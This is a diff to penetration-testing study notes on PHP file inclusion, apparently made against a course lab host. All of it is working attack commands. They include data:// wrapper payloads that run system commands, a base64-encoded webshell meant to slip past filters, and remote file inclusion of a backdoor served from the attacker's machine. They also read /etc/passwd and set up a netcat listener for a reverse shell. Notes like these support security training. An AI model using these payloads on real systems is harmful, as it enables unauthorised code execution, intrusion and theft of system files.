@@ -181,3 +181,11 @@ quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:
 - Using the ```data://``` call executing the ```ls``` command: ```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"```
 - When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper: ```echo -n '<?php echo system($_GET["cmd"]);?>' | base64```
   - Then: ```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,<output>&cmd=ls"```
+
+## Remote File Inclusion (RFI)
+
+- Kali Linux includes several PHP webshells in the ```/usr/share/webshells/php/``` directory
+  - For example: ```cat simple-backdoor.php``` >> Usage: ```http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd```
+- Start a webserver in the ```/usr/share/webshells/php/``` directory: ```python3 -m http.server 80```
+- Use curl to include the hosted file via HTTP and specify 'ls' as our command: ```curl "http://mountaindesserts.com/meteor/index.php?page=http://<local IP>/simple-backdoor.php&cmd=ls"```
+- Using the reverse shell, start a netcat listener on 4444: ```nc –nlvp 4444```
